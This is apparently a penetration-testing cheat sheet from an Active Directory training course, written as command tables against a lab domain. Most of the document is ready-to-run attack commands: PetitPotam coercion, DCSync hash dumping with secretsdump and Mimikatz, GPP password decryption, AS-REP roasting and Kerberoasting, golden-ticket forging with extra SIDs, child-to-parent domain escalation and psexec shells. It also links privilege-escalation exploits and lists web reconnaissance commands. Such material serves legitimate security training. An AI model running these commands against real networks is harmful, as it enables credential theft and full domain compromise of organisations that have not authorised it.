| ``git clone https://github.com/topotam/PetitPotam.git`` | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |

| ``python3 PetitPotam.py 172.16.5.225 172.16.5.5`` | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |

| ``python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |

| ``secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |

| ``klist`` | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |

| ``python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |

| ``secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |

| ``.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |

| ``mimikatz ## lsadump::dcsync /user:inlanefreight\krbtgt`` | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |

| ``Import-Module .\SecurityAssessment.ps1`` | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |

| ``Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |

| ``adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`` | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |

| ``adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`` | Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host. |

| ``Get-DomainUser * \| Select-Object samaccountname,description `` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |

| ``Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol`` | PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |

| ``ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`` | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

| ``gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`` | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |

| ``crackmapexec smb -L \| grep gpp`` | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |

| ``crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |

| ``Get-DomainGPO \| select displayname`` | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |

| ``Get-GPO -All \| Select DisplayName`` | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. |

| ``$sid=Convert-NameToSid "Domain Users" `` | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |

| ``Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid`` | PowerView tool that is used to check if the `Domain Users`  (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |

| ``Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`` | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host. |

| ``Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl`` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host. |

| ``.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`` | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host. |

| ``hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt `` | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host. |

| ``kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ` optional export to file >>` | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |

| ``Import-Module activedirectory`` | Used to import the `Active Directory` module. Performed from a Windows-based host. |

| ``Get-ADTrust -Filter *`` | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |

| ``Get-DomainTrust `` | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |

| ``Get-DomainTrustMapping`` | PowerView tool used to perform a domain trust mapping from a Windows-based host. |

| ``Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName`` | PowerView tools used to enumerate users in a target child domain from a Windows-based host. |

| ``mimikatz ## lsadump::dcsync /user:LOGISTICS\krbtgt`` | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host. |

| ``Get-DomainSID`` | PowerView tool used to get the SID for a target child domain from a Windows-based host. |

| ``Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`` | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host. |

| ``ls \\academy-ea-dc01.inlanefreight.local\c$`` | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |

| ``mimikatz ## kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host . |

| ``.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`` | Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host. |

| ``mimikatz ## lsadump::dcsync /user:INLANEFREIGHT\lab_adm`` | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |

| ``secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`` | Impacket tool used to perform a DCSync attack from a Linux-based host. |

| ``lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 `` | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host. |

| ``lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"`` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |

| ``lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`` | Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host. |

| ``ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`` | Impacket tool used to create a `Golden Ticket` from a Linux-based host. |

| ``export KRB5CCNAME=hacker.ccache`` | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host. |

| ``psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |

| ``raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |

| ``Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName`` | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host. |

| ``Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof`` | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host. |

| ``.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`` | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host. |

| ``Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |

| ``Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. |

| ``GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`` | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |

| ``bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |

| ``zip -r ilfreight_bh.zip *.json`` | Used to compress multiple files into a single `.zip` file to be uploaded into the BloodHound GUI. |

| `[Juicy Potato](https://github.com/ohpe/juicy-potato)` | Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803 |

| `[Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato)` | Automated Juicy Potato :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803 |

| `[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)` | Exploit the PrinterBug for System Impersonation :pray: Works for Windows Server 2019 and Windows 10 |

| `[RoguePotato](https://github.com/antonioCoco/RoguePotato)` | Upgraded Juicy Potato :pray: Works for Windows Server 2019 and Windows 10 |

| `[Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)` |  |

| `[SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)` | [PoC](https://github.com/danigargu/CVE-2020-0796) |

| `--------------------------------------------------------------------------------------` | -------------------------------------- |

| `[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)` | Misconfiguration Abuse |

| `[BeRoot](https://github.com/AlessandroZ/BeRoot)` | General Priv Esc Enumeration Tool |

| `[Privesc](https://github.com/enjoiz/Privesc)` | General Priv Esc Enumeration Tool |

| `[FullPowers](https://github.com/itm4n/FullPowers)` | Restore A Service Account's Privileges |



## Reconnaissance

### Web-based

| Command | Description |
| ------- | ----------- |

| `**Command**` | **Description** |

| `----------------------------` | ----------------------------------------- |

| ``export TARGET="domain.tld"`` | Assign target to an environment variable. |

| ``whois $TARGET`` | WHOIS lookup for the target. |

| `**Resource/Command**` | **Description** |

| `------------------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| `[VirusTotal](https://www.virustotal.com/gui/home/url)` | VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. |

| `[Censys](https://censys.io/)` | CT logs to discover additional domain names and subdomains for a target organization |

| `[Crt.sh](https://crt.sh/)` | CT logs to discover additional domain names and subdomains for a target organization |

| ``curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u`` | All subdomains for a given domain. |

| ``curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u`` | All TLDs found for a given domain. |

| ``curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u`` | All results across all TLDs for a given domain. |

| ``curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u`` | Reverse DNS lookup on IP address. |

| ``curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u`` | Reverse DNS lookup of a CIDR range. |

| ``curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u`` | Certificate Transparency. |

| ``cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done`` | Searching for subdomains and other information on the sources provided in the source.txt list. |

| ``head/tail -n20 facebook.com_crt.sh.txt`` | To view the top/bottom 20 lines from a file |

| `[TheHarvester](https://github.com/laramies/theHarvester)` | The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering. For now, we will use the following modules |

| `----------------------------------------------------------------------------------------------------------` | ---------------------------------------------------------------------------------------- |

| ``HackerTarget`` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |

| ``SecLists`` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |

| ``nslookup -type=any -query=AXFR $TARGET nameserver.target.domain`` | Zone Transfer using Nslookup against the target domain and its nameserver. |

| ``gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"`` | Bruteforcing subdomains. |


